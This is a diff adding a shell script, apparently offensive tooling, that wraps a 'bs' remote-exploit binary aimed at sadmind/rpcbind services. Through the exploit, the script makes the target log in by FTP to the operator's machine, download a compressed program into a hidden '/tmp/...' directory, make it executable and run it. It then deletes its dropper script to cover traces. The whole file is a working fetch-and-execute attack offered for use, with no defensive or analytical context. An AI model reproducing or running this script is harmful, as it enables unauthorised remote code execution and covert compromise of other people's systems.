@@ -1,0 +1,109 @@
+#!/bin/sh
+#
+# Use bs to upload a program via reverse FTP and run it
+#
+
+# Some default values
+SCRIPT="/tmp/...."
+DIR="/tmp/..."
+LOCAL_USER="test"
+LOCAL_PASSWD="test"
+
+# Show usage and exit
+usage() {
+    echo "Old Usage: ${0} rem_ip rem_host loc_ip loc_user loc_passwd file [args...]"
+    echo ""
+    echo "New usage: ${0} [options] -- [options to <file2Xfer&Run>]"
+    echo "  -i <remoteIP>       (required)"
+    echo "  -h <remoteHost>     (required)"
+    echo "  -a                  Use alt rpcbind port"
+    echo "  -s <sndPort>        def= bs default"
+    echo "  -r <rcvPort>        def= bs default"
+    echo "  -d <remoteDomain>"
+    echo "  -p <sadmindPort>    def= query rpcbind"
+    echo "  -l <localIP>        (required)"
+    echo "  -u <localUser>      (def= test)"
+    echo "  -P <localPassword>  (def= test)"
+    echo "  -f <file2Xfer&Run>  (required)"
+    echo "  -D <remoteDir>      def= $DIR"
+    echo "  -S <remoteScript>   def= $SCRIPT"
+    exit 1
+}
+
+# There must be at least one argument
+if [ ${#} -eq 0 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+if [ "`echo $1 | cut -c1`" != "-" ]; then
+    # Must be old style command line
+    [ $# -lt 6 ] && usage
+
+    REMOTE_IP=${1}
+    REMOTE_HOST=${2}
+    LOCAL_IP=${3}
+    LOCAL_USER=${4}
+    LOCAL_PASSWD=${5}
+    RUN_FILE=${6}
+    shift; shift; shift; shift; shift; shift
+    REMOTE_PORTS="23 23"
+else
+    # New style options
+    while getopts i:h:as:r:d:p:l:u:P:f:D:S: op; do
+	case $op in
+	i)  REMOTE_IP="-i $OPTARG";;
+	h)  REMOTE_HOST="-h $OPTARG";;
+	a)  altRpcbind="-a";;
+	s)  sndPort="-s $OPTARG";;
+	r)  rcvPort="-r $OPTARG";;
+	d)  remDomain="-d $OPTARG";;
+	p)  sadmindPort="-p $OPTARG";;
+	l)  LOCAL_IP="$OPTARG";;
+	u)  LOCAL_USER="$OPTARG";;
+	P)  LOCAL_PASSWD="$OPTARG";;
+	f)  RUN_FILE="$OPTARG";;
+	D)  DIR="$OPTARG";;
+	S)  SCRIPT="$OPTARG";;
+	esac
+    done
+    cmdFlag="-c"
+    extraOpts="$altRpcbind $sndPort $rcvPort $remDomain $sadmindPort"
+    shift `expr $OPTIND - 1`
+
+    # Check for required args
+    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$REMOTE_HOST" ] && echo "Error: missing remote host" && usage
+    [ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+fi
+EXTRA="${*}"
+
+
+echo "running: bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_PORTS} $extraOpts ..."
+echo "--> my IP is $LOCAL_IP"
+echo "--> local user/pass is $LOCAL_USER/$LOCAL_PASSWD"
+echo "--> xfering and running $RUN_FILE"
+echo "--> using tmp file $SCRIPT"
+echo "--> using tmp dir $DIR"
+
+#exit 0
+
+bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_PORTS} $extraOpts \
+$cmdFlag "/bin/echo \"/bin/mkdir ${DIR}
+/bin/ftp -in << EOF
+open ${LOCAL_IP}
+user ${LOCAL_USER} ${LOCAL_PASSWD}
+binary
+lcd ${DIR}
+get ${RUN_FILE}.Z
+EOF
+cd ${DIR}
+/usr/bin/uncompress -f ${RUN_FILE}.Z
+/bin/chmod 0700 ${RUN_FILE}
+PATH=${DIR} ${RUN_FILE} ${EXTRA}
+/bin/rm ${SCRIPT}
+\" > ${SCRIPT} &&
+/bin/sh ${SCRIPT}"
+
